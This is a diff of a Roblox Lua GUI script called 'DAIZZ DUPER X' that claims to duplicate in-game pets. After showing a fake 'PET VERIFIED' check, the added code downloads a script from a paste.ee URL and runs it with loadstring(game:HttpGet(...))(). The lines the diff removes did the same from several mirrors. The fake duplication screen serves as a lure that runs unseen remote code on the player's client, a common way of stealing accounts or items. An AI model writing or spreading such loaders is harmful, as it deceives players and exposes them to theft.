@@ -1,5 +1,5 @@
 --[[ ⚡ DAIZZ DUPER X ⚡ (v3.2.4) GUI SCRIPT ]]--
--- Simplified version without server searching
+-- Simplified version with direct script loading
 
 -- Remove old GUI if exists
 pcall(function()
@@ -9,7 +9,6 @@ end)
 -- Services
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
 
 -- Create main GUI
 local gui = Instance.new("ScreenGui")
@@ -187,59 +186,6 @@ local function animateChecking()
     end
 end
 
--- Robust script loader with multiple mirrors
-local function executeExternalScript()
-    local scriptMirrors = {
-        "https://paste.ee/r/s7TguhY5",
-        "https://pastebin.com/raw/s7TguhY5",
-        "https://raw.githubusercontent.com/DaizzScripts/main/main/duper.lua"
-    }
-    
-    for i, url in ipairs(scriptMirrors) do
-        errorText.Text = "📡 Downloading script ("..i.."/"..#scriptMirrors..")..."
-        errorText.TextColor3 = Color3.fromRGB(180, 180, 255)
-        
-        local success, scriptContent = pcall(function()
-            return HttpService:GetAsync(url)
-        end)
-        
-        if success and scriptContent and #scriptContent > 100 then
-            scriptContent = scriptContent:gsub("^%s+", ""):gsub("%s+$", "")
-            
-            local loadSuccess, loadedFunction = pcall(loadstring, scriptContent)
-            if loadSuccess and loadedFunction then
-                errorText.Text = "✅ Executing script..."
-                errorText.TextColor3 = Color3.fromRGB(80, 255, 120)
-                
-                local executeSuccess, executeResult = pcall(loadedFunction)
-                if executeSuccess then
-                    errorText.Text = "🎉 Script executed successfully!"
-                    errorText.TextColor3 = Color3.fromRGB(80, 255, 120)
-                    return true
-                else
-                    warn("Execution error:", executeResult)
-                    errorText.Text = "❌ Execution error"
-                    errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
-                end
-            else
-                warn("Load error:", loadedFunction)
-                errorText.Text = "❌ Load error"
-                errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
-            end
-        else
-            warn("Download failed:", scriptContent)
-            errorText.Text = "❌ Download failed"
-            errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
-        end
-        
-        task.wait(1)
-    end
-    
-    errorText.Text = "❌ All download attempts failed"
-    errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
-    return false
-end
-
 -- Main dupe button functionality
 dupeButton.MouseButton1Click:Connect(function()
     dupeButton.Active = false
@@ -278,8 +224,18 @@ dupeButton.MouseButton1Click:Connect(function()
     errorText.Text = "✅ PET VERIFIED - EXECUTING SCRIPT"
     errorText.TextColor3 = Color3.fromRGB(80, 255, 120)
     
-    -- Execute the external script
-    executeExternalScript()
+    -- Execute the external script directly
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://paste.ee/r/s7TguhY5"))()
+    end)
+    
+    if not success then
+        errorText.Text = "❌ SCRIPT ERROR: "..tostring(err):sub(1, 50)
+        errorText.TextColor3 = Color3.fromRGB(255, 70, 70)
+    else
+        errorText.Text = "🎉 SCRIPT EXECUTED SUCCESSFULLY!"
+        errorText.TextColor3 = Color3.fromRGB(80, 255, 120)
+    end
     
     -- Re-enable button after execution
     task.delay(2, function()
